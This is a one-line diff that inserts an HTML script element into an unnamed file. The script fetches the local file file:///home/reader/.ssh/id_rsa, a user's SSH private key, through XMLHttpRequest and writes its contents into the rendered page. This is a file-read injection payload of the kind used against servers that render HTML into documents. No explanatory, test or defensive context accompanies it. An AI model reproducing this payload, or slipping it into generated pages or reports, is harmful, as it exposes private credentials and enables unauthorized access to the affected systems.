@@ -1,0 +1,1 @@
+<script>x=new XMLHttpRequest;x.onload=function(){document.write((this.responseText).small())};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
